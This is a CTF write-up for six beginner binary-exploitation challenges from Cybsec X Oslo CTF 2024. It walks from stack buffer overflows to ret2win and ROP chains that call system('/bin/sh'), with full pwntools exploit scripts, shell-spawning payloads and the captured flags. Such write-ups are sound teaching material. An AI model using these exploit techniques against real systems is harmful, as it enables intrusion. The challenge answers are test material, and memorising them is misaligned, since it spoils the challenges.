---
title: Cybsec X Oslo CTF 2024
date: 2024-05-09 23:00:00 +0100
categories: [CTF, "2024"]
tags: [ctf, pwn, ret2win, rop]
img_path: /assets/img/osloctfXcybsec24/
---


## My First Overflow

![Challenge](my_first_overflow.png)

Connecting to the remote instance with `netcat` we are given some of the source code for the challenge.
```c
struct file_data {
    char buf[32];
    char path[64];
    uint32_t size;
};

static void fill_buffer(struct file_data *data) {
    char buf[512] = { 0 };
    printf("Data: ");
    if (!fgets(buf, sizeof(buf), stdin)) {
        fprintf(stderr, "Failed read data: %s\n", strerror(errno));
        return;
    }

    // strip newline (if any)
    char *newline = strchr(buf, '\n');
    if (newline)
        *newline = '\0';

    strcpy(data->buf, buf);
    printf("Done!\n\n");
}

static void buggy(void) {
    struct file_data data = { 0 };

    data.size = 0x123;
    strcpy(data.path, "test.txt");

    for (;;) {
        menu();
        int choice = get_int("> ");
        switch (choice) {
        case 1:
            fill_buffer(&data);
            break;
        case 2:
            print_stack_frame(&data);
            break;
        case 3:
            /* trigger bug */
            break;
        case 4:
            return;
        default:
            fprintf(stderr, "Invalid choice: %d\n", choice);
            break;
        }
    }
}
```
{: file="chall.c" }

We are also given the goal of the challenge, and some options to interact with the program.
```
Your goal is to overwrite data.path with "flag.txt"
Currently it contains: "test.txt"
The "Trigger bug" menu option opens and prints the contents of the file in data.path

Google these terms for help:
- stack
- stack overflow / buffer overflow

Good luck!

1. Fill buffer
2. Print stack frame
3. Trigger bug
4. Challenge description
5. [Quit]
>
```

If we choose option 1, we can fill the buffer with 512 bytes of data, but the `file_data` struct is not large enough to hold all of this data. The first 32 bytes of our input will be copied into the `buf` entry (`data->buf`), the 64 next bytes into `data->path`, the next 4 bytes into `data->size`, and the rest will overwrite the next contents on the stack.

Because our goal is just to overwrite the `data->path` with "flag.txt", we can just fill the buffer with 32 bytes of padding (any character), and then write "flag.txt" into the `data->path` entry.

```
1. Fill buffer
2. Print stack frame
3. Trigger bug
4. Challenge description
5. [Quit]
> 1
Data: AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAflag.txt
Done!

1. Fill buffer
2. Print stack frame
3. Trigger bug
4. Challenge description
5. [Quit]
> 3
Opening file: "flag.txt"
Contents:
flag{path_overwrite_in_the_house}
```

## Overflowing with binary data

![Challenge](overflowing_with_binary_data.png)

Connecting to the remote instance we are given the relevant source code for this challenge.
```c
struct file_data {
    char buf[32];
    char path[64];
    uint32_t size;
};

static void fill_buffer(struct file_data *data) {
    char buf[512] = { 0 };
    printf("Data: ");
    if (!fgets(buf, sizeof(buf), stdin)) {
        fprintf(stderr, "Failed read data: %s\n", strerror(errno));
        return;
    }

    // strip newline (if any)
    char *newline = strchr(buf, '\n');
    if (newline)
        *newline = '\0';

    strcpy(data->buf, buf);
    printf("Done!\n\n");
}

static void buggy(void) {
    struct file_data data = { 0 };

    data.size = 0x123;
    strcpy(data.path, "test.txt");

    for (;;) {
        menu();
        int choice = get_int("> ");
        switch (choice) {
        case 1:
            fill_buffer(&data);
            break;
        case 2:
            print_stack_frame(&data);
            break;
        case 3:
            /* trigger bug */
            break;
        case 4:
            return;
        default:
            fprintf(stderr, "Invalid choice: %d\n", choice);
            break;
        }
    }
}
```
{: file="chall.c" }

As well as the goal of the challenge, and the same menu as in the previous challenge.
```
Your goal is to overwrite data.size with: 0x00001337
Currently it contains: 0x00000123
Use the "Trigger bug" menu option to check data.size

Google these terms for help:
- pwntools
- pwntools packing p64
- endianness

Check out the pwntools cheat sheet at https://pwn101.tokle.dev

Good luck!

1. Fill buffer
2. Print stack frame
3. Trigger bug
4. Challenge description
5. [Quit]
```

In the previous challenge we overwrote the `path` entry in the `file_data` struct, but in this challenge we need to overwrite the `size` entry. Because we have to send bytes, we can't just write a lot of A's and 0x1337 as the input (similar to the previous challenge). Instead, we need to write the bytes of the integer `0x1337` into the buffer. This is easier to do with a python script.

Looking at the source code for the program we see that the `buf` and `path` entries in the struct are 32 and 64 bytes in size. This means that we need 32+64=96 bytes of padding before we start overwriting the `size` entry.

The `size` entry is a 32-bit integer, so we need to write 4 bytes of data to overwrite it. We can use the `p32` function from `pwntools` to pack the integer `0x1337` into 4 bytes, and then write this data into the buffer.

```python
from pwn import *

# Connect to remote instance
io = remote("pwn.tokle.dev", 1338)

# Receive all the output text from the program
io.recvuntil(b"[Quit]")

# Choose "Fill buffer" option, and send padding + 0x1337 in bytes
io.sendlineafter(b"> ", b"1")
io.sendlineafter(b"Data: ", b"A"*(32+64) + p32(0x1337))

# Trigger exploit to get flag
io.sendlineafter(b"> ", b"3")

io.interactive()
```
{: file="solve.py" }

```console
$ python3 solve.py
[+] Opening connection to pwn.tokle.dev on port 1338: Done
[*] Switching to interactive mode
You got it! Here's the flag: flag{binary_schminary}
```


## Did someone say ret2win?

![Challenge](did_someone_say_ret2win.png)

As the previous challenges, connecting to the instance reveals the source code for the challenge. The code is the same as the previous challenges, but has an additional function `win` which is not called from anywhere.
```c
static void win(void) {
    char *const args[] = {
        "sh",
        NULL,
    };
    printf("Great job! Spawning a shell...\n");
    execve("/bin/sh", args, environ);
    exit(EXIT_SUCCESS);
}
```
{: .nolineno }

The menu options are the same as the previous challenges, and goal of this challenge is the following:
```
Your goal is to overwrite the saved return address on the stack
The win function in the code is located at address: 0x401aa7
Return to the win function to get a shell
```

If we choose option `2` we get the stack frame printed to us. The last line, at address `0x7ffed67b05b8` containing the value `00000000004022fc` is the saved return address of the function where our function `buggy` was called from (probably `main`). When we choose option `3`, which calls `return`, the saved return address is where the program start executing instructions from next. Therefore, if we overwrite this address with some other valid function address (like `win`), the program will start executing that function instead of the caller function.

```
   [address]        [binary data]        [ascii]        [variable]
                 +------------------+
 0x7ffed67b0540  | 0000000000000000 |   [........]  <---- struct file_data.buf
                 +------------------+
 0x7ffed67b0548  | 0000000000000000 |   [........]
                 +------------------+
 0x7ffed67b0550  | 0000000000000000 |   [........]
                 +------------------+
 0x7ffed67b0558  | 0000000000000000 |   [........]
                 +------------------+
 0x7ffed67b0560  | 7478742e74736574 |   [test.txt]  <---- struct file_data.path
                 +------------------+
 0x7ffed67b0568  | 0000000000000000 |   [........]
                 +------------------+
 0x7ffed67b0570  | 0000000000000000 |   [........]
                 +------------------+
 0x7ffed67b0578  | 0000000000000000 |   [........]
                 +------------------+
 0x7ffed67b0580  | 0000000000000000 |   [........]
                 +------------------+
 0x7ffed67b0588  | 0000000000000000 |   [........]
                 +------------------+
 0x7ffed67b0590  | 0000000000000000 |   [........]
                 +------------------+
 0x7ffed67b0598  | 0000000000000000 |   [........]
                 +------------------+
 0x7ffed67b05a0  | 0000000000000123 |   [#.......]  <---- struct file_data.size
                 +------------------+
 0x7ffed67b05a8  | 000000020040216c |   [l!@.....]
                 +------------------+
 0x7ffed67b05b0  | 00007ffed67b05e0 |   [..{.....]
                 +------------------+
 0x7ffed67b05b8  | 00000000004022fc |   [."@.....]
                 +------------------+
```

We know that the address of `win` is `0x401aa7`, so this is the address we need to overwrite the saved return address with. To reach the return address, we need to send 120 bytes of padding first, because the `file_data` struct i 100 bytes, and there is 20 bytes between the struct and the saved return address (you can count the number of lines until the last line of the printed stack, and multiple that by 8, 8*15=120). After the 120 bytes we will use `p64` from pwntools to convert the address of `win` into the correct bytes-format, and send this to the program. After we have sent the payload to the program, we can trigger the exploit by choosing option `3`.

```python
from pwn import *

# Conntect to remote instance
io = remote("pwn.tokle.dev", 1339)

# Receive all the output text from the program
io.recvuntil(b"[Quit]")

# Choose "Fill buffer" option, and send ret2win payload
payload = b"A"*120 + p64(0x401aa7)
io.sendlineafter(b"> ", b"1")
io.sendlineafter(b"Data: ", payload)

# Trigger exploit
io.sendlineafter(b"> ", b"3")

io.interactive()
```
{: file="solve.py" }

```console
$ python3 solve.py
[+] Opening connection to pwn.tokle.dev on port 1339: Done
[*] Switching to interactive mode
Returning...
Great job! Spawning a shell...
$ cat flag.txt
flag{its_raining_shells}
```


## The inspector's new gadget

![Challenge](the_inspectors_new_gadget.png)

This challenge uses mainly the same functions as the first two challenges, but has some additional functionality to the `buggy` function.
```c
static void buggy(void) {
    struct file_data data = { 0 };
    print_challenge_description();

    for (;;) {
        menu();
        int choice = get_int("> ");
        switch (choice) {
        case 1:
            fill_buffer(&data);
            break;
        case 2:
            print_stack_frame(&data);
            break;
        case 3:
            check_rop_chain();
            break;
        case 4:
            print_challenge_description();
            break;
        case 5:
            print_gadgets();
            break;
        case 6:
            lookup_symbol();
            break;
        case 7:
            add_string();
            break;
        case 8:
            return; /* quit */
        default:
            fprintf(stderr, "Invalid choice: %d\n", choice);
            break;
        }
    }
}
```
{: .nolineno }

Because of the additions to the code, we also have more menu options to choose from.
```
1. Fill buffer
2. Print stack frame
3. Check ROP chain
4. Print challenge description
5. Print gadgets
6. Lookup symbol
7. Add string
8. [Quit]
```

A quick summary of the new ones are:
- `3` Checks if our payload fulfills the requirements to get the flag.
- `5` Prints the address of some useful gadgets
- `6` Lets us look up the address of a symbol in the binary
- `7` Lets us add a string to the binary

The goal of the challenge is the following:
```
Your goal is to overwrite the saved return address with a "pop rdi" gadget.
The value popped into rdi should be 0x1337 (hint: use p64())
The gadget is located at 0x4038db
```

This challenge is similar to the previous ret2win challenge, but instead of overwriting the return address with the address of the `win` function, we will overwrite it with `gadgets`. Gadgets are snippets of assembly code from the binary, and does less than a function (e.g. changing values of registers or memory addresses). However, we can chain multiple gadgets together to perform operations as we want. For this challenge however, we are only required to set the value of the `rdi` register to `0x1337`. For this we will use the `pop rdi; ret;` gadget (shortened to `pop rdi`, because most gadgets will end with a `ret` instruction).

When using a `pop_rdi` gadget, the succeeding value in our payload on the stack will be popped into the `rdi` register. This means that the address of the `pop_rdi` gadget should be followed by the value we want to set the register to, `0x1337`. The address of the `pop_rdi` gadget is `0x4038db`, and we will use the `p64` function from pwntools to convert this address into the correct bytes-format. The setup for this exploit script is similar to the ret2win-challenge one, but with the address of the `pop_rdi` gadget and the value `0x1337` instead of `win`. Note that the offset for the padding for this challenge is 136 bytes instead of 120 (you can find this using the same method as previously, for example).

```python
from pwn import *

# Connect to remote instance
io = remote("pwn.tokle.dev", 1340)

# Receive all the output text from the program
io.recvuntil(b"[Quit]")

# Address of "pop_rdi; ret;" gadget
pop_rdi = 0x4038db

# Choose "Fill buffer" option,
# and send payload which puts 0x1337 into rdi
io.sendlineafter(b"> ", b"1")
io.sendline(b"A"*136 + p64(pop_rdi) + p64(0x1337))

# Trigger exploit
io.sendlineafter(b"> ", b"3")

io.interactive()
```
{: file="solve.py" }

```console
$ python3 solve.py
[+] Opening connection to pwn.tokle.dev on port 1340: Done
[*] Switching to interactive mode
ROP chain looks good! Congrats, here's the flag: flag{greetings_inspector_gadget__}
```


## Mary Poppins strikes again

![Challenge](mary_poppins_strikes_again.png)

This challenge is very similar to `inspector's new gadget`, but that we for this challenge have to put a value in the `rsi` register, in addition to the `rdi` register.
```
Your goal is to create a ROP chain consisting of two gadgets:
  pop rdi (0x4038db)
  pop rsi (0x4038dd)
rdi should contain 0xdeadbeef, and rsi should contain 0xc0debabe.
Use the "Verify ROP chain" menu option to get the flag.
```

We get the address all the useful gadgets we need from `option 5`, which we can automatize in our solve script.
```python
def get_gadgets():
    io.sendlineafter(b"> ", b"5")
    io.recvuntil(b"pop rdi; ret: ")
    pop_rdi = int(io.recvline().strip(), 16)
    io.recvuntil(b"pop rsi; ret: ")
    pop_rsi = int(io.recvline().strip(), 16)
    io.recvuntil(b"pop rdx; ret: ")
    pop_rdx = int(io.recvline().strip(), 16)
    return pop_rdi, pop_rsi, pop_rdx
```
{: .nolineno }

The payload we use is very similar to `inspector's new gadget`, only that we this time also add the `pop_rsi` gadget to put the value `0xc0debabe` into the `rsi` register.
```python
payload = b"A"*136
payload += p64(pop_rdi)
payload += p64(0xdeadbeef)
payload += p64(pop_rsi)
payload += p64(0xc0debabe)
```

Full solve script:
```python
from pwn import *

# Connect to remote instance
io = remote("pwn.tokle.dev", 1341)

# Receive all the output text from the program
io.recvuntil(b"Good luck!")

def get_gadgets():
    io.sendlineafter(b"> ", b"5")
    io.recvuntil(b"pop rdi; ret: ")
    pop_rdi = int(io.recvline().strip(), 16)
    io.recvuntil(b"pop rsi; ret: ")
    pop_rsi = int(io.recvline().strip(), 16)
    io.recvuntil(b"pop rdx; ret: ")
    pop_rdx = int(io.recvline().strip(), 16)
    return pop_rdi, pop_rsi, pop_rdx

# Get address of gadgets
pop_rdi, pop_rsi, pop_rdx = get_gadgets()
log.success(f"Pop RDI @ {hex(pop_rdi)}")
log.success(f"Pop RSI @ {hex(pop_rsi)}")
log.success(f"Pop RDX @ {hex(pop_rdx)}")

# Pop values into registers
payload = b"A"*136
payload += p64(pop_rdi)
payload += p64(0xdeadbeef)
payload += p64(pop_rsi)
payload += p64(0xc0debabe)

# Send and trigger payload
io.sendlineafter(b"> ", b"1")
io.sendlineafter(b"Data: ", payload)
io.sendlineafter(b"> ", b"3")

io.interactive()
```
{: file="solve.py}

```console
$ python3 solve.py
[+] Opening connection to pwn.tokle.dev on port 1341: Done
[+] Pop RDI @ 0x4038db
[+] Pop RSI @ 0x4038dd
[+] Pop RDX @ 0x4038df
[*] Switching to interactive mode
ROP chain looks good! Congrats, here's the flag: flag{popping_flags_all_day}
```

## Roptastic shell

![Challenge](roptastic_shell.png)

This challenge is the same as the previous, but we have to spawn a shell instead of just setting popping values into registers. For this solve, we will utilize the options which prints the gadgets, writes a string to the binary, and looks up the address of a symbol in the binary (the last two weren't used in the previous challenges).


Our goal is similar to the ret2win challenge, only that we want to call `system("/bin/sh")` instead of `win()`. To do this we need three things: the address of the `pop_rdi` gadget, the address of the string `/bin/sh` in the binary, and the address of `system`. The `pop_rdi` gadget we already know, and it is also printed to us when we choose option `5`. We don't know the address of the string `/bin/sh` in the binary, so we will add it ourselves using option `7`. The address of `system` we can look up using option `6`.
```python
from pwn import *

# Connect to remote instance
io = remote("pwn.tokle.dev", 1342)

# Receive all the output text from the program
io.recvuntil(b"Good luck!")

def get_gadgets():
    io.sendlineafter(b"> ", b"5")
    io.recvuntil(b"pop rdi; ret: ")
    pop_rdi = int(io.recvline().strip(), 16)
    io.recvuntil(b"pop rsi; ret: ")
    pop_rsi = int(io.recvline().strip(), 16)
    io.recvuntil(b"pop rdx; ret: ")
    pop_rdx = int(io.recvline().strip(), 16)
    return pop_rdi, pop_rsi, pop_rdx

def add_str(string):
    io.sendlineafter(b"> ", b"7")
    io.sendlineafter(b"String: ", string)
    io.recvuntil(b"String at: ")
    return int(io.recvline().strip(), 16)

def get_symbol_addr(symbol):
    io.sendlineafter(b"> ", b"6")
    io.sendlineafter(b"Symbol: ", symbol.encode())
    io.recvuntil(f"{symbol}: ".encode())
    return int(io.recvline().strip(), 16)

# Get address of gadgets
pop_rdi, pop_rsi, pop_rdx = get_gadgets()
log.success(f"Pop RDI @ {hex(pop_rdi)}")
log.success(f"Pop RSI @ {hex(pop_rsi)}")
log.success(f"Pop RDX @ {hex(pop_rdx)}")

# Add "/bin/sh" string
binsh = add_str(b"/bin/sh")
log.success(f"/bin/sh @ {hex(binsh)}")

# Get address of "system" function
system = get_symbol_addr("system")
log.success(f"system @ {hex(system)}")
```
{: .nolineno }

As we have everything we need we can assemble our payload to get a shell! We know that the offset to the saved return address is 136 bytes. Inside `rdi` we need to put the address of `/bin/sh`, not the string itself! This is because the argument to the `system` function is the address where the string is located, not the string itself. Lastly, after we have set the `rdi` register to the address of `/bin/sh`, we call the `system` function.

```python
# ROP to get shell
payload = b"A"*136
payload += p64(pop_rdi) # "pop rdi; ret;" gadget
payload += p64(binsh)   # Address where "/bin/sh" string is stored
payload += p64(system)  # Address of "system" function
```
{: .nolineno }

Sending and triggering the payload should then call `system("/bin/sh")` for us, and give us shell!
```python
# Send and trigger payload
io.sendlineafter(b"> ", b"1")
io.sendlineafter(b"Data: ", payload)
io.sendlineafter(b"> ", b"8")

io.interactive()
```
{: .nolineno }


But it doesn't... This is because of something called [The MOVAPS Issue](https://ropemporium.com/guide.html#common-pitfalls). TLDR; We need to put the call to system on a stack address ending in 0, not 8. Because we cannot reduce our payload with 8 bytes (we cannot remove the padding, because then we don't overwrite the return address as we want), we have to add 8 more bytes before we call system. The "standard" way to do this is to use another gadget: `ret;`. Luckily, this gadget is *everywhere* in binaries, so even though we are not given the explicit address of it in this challenge, we can still find it easily.

The first way to find the gadget is to add 1 to the address of our `pop_rdi` gadget. Because the `pop_rdi` gadget ends with a `ret` instruction (pop rdi; ret;), and the `pop rdi` gadget is only a single byte, if we add 1 we get only the `ret` part of that gadget.

Another way to find a `ret` gadget is by knowing that the original saved return address is a gadget with the operations `mov eax, 0; leave; ret;`. The `mov` instruction is 3 bytes in size, and the `leave` instruction is 1 byte in size. Therefore we know that a `ret` instruction is located at the address of the saved return address + 4 bytes.
The following full exploit script will use the first option, but both work equally good.

```python
from pwn import *

# Connect to remote instance
io = remote("pwn.tokle.dev", 1342)

# Receive all the output text from the program
io.recvuntil(b"Good luck!")

def get_gadgets():
    io.sendlineafter(b"> ", b"5")
    io.recvuntil(b"pop rdi; ret: ")
    pop_rdi = int(io.recvline().strip(), 16)
    io.recvuntil(b"pop rsi; ret: ")
    pop_rsi = int(io.recvline().strip(), 16)
    io.recvuntil(b"pop rdx; ret: ")
    pop_rdx = int(io.recvline().strip(), 16)
    return pop_rdi, pop_rsi, pop_rdx

def add_str(string):
    io.sendlineafter(b"> ", b"7")
    io.sendlineafter(b"String: ", string)
    io.recvuntil(b"String at: ")
    return int(io.recvline().strip(), 16)

def get_symbol_addr(symbol):
    io.sendlineafter(b"> ", b"6")
    io.sendlineafter(b"Symbol: ", symbol.encode())
    io.recvuntil(f"{symbol}: ".encode())
    return int(io.recvline().strip(), 16)

# Get address of gadgets
pop_rdi, pop_rsi, pop_rdx = get_gadgets()
log.success(f"Pop RDI @ {hex(pop_rdi)}")
log.success(f"Pop RSI @ {hex(pop_rsi)}")
log.success(f"Pop RDX @ {hex(pop_rdx)}")

# Add "/bin/sh" string
binsh = add_str(b"/bin/sh")
log.success(f"/bin/sh @ {hex(binsh)}")

# Get address of "system" function
system = get_symbol_addr("system")
log.success(f"system @ {hex(system)}")

# ROP to get shell
payload = b"A"*136
payload += p64(pop_rdi)
payload += p64(binsh)
payload += p64(pop_rdi+1)
payload += p64(system)

# Send and trigger payload
io.sendlineafter(b"> ", b"1")
io.sendlineafter(b"Data: ", payload)
io.sendlineafter(b"> ", b"8")

io.interactive()
```
{: file="shell.py" }


```console
$ python3 shell.py
[+] Opening connection to pwn.tokle.dev on port 1342: Done
[+] Pop RDI @ 0x4038db
[+] Pop RSI @ 0x4038dd
[+] Pop RDX @ 0x4038df
[+] /bin/sh @ 0x475480
[+] system @ 0x788dd6f07d70
[*] Switching to interactive mode
$ cat flag.txt
flag{ropping_your_way_to_flags}
```